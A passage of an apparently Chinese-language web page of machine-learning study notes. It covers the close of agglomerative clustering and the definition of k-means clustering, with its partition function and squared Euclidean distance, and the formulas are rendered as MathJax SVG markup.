data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2556.1,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(3056.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4064.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4509.3,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5517.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5962.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(6971.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(7415.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(8424.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(8869,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(9877.5,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>。至此，所有样本聚成一类，聚类终止。</p><h2 id="9-4-k均值聚类"><a href="#9-4-k均值聚类" class="headerlink" title="9.4 k均值聚类"></a>9.4 k均值聚类</h2><p>k均值聚类是基于样本集合划分的聚类算法。每个样本只能属于一个类，所以k均值聚类是硬聚类。</p><p>k均值聚类将样本集合划分为k个子集，构成k个类，将n个样本分到k个类中，每个样本到其所属类的中心的距离最小。</p><p>模型：用C表示划分，一个划分对应着一个聚类结果。划分C是多对一函数，划分或者聚类可以用函数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.951ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3514.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(575.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1631.6,0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(2391.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2780.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3125.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>表示，其中样本用一个整数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.476ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6840.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(622.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mo" transform="translate(1567.6,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mn" transform="translate(2067.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2567.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3012.2,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(3512.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3956.9,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(5295.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5740.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6340.2,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>表示，类用一个整数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.191ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6714.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(575.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mo" transform="translate(1520.6,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mn" transform="translate(2020.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2520.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(2965.2,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(3465.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3909.9,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(5248.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5693.2,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(6214.2,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>表示。</p><p>策略：通过损失函数的最小化选取最优的划分或函数C*。</p><p>首先采用欧氏距离平方作为样本之间的距离<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="8.118ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 3587.9 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(520,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(909,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 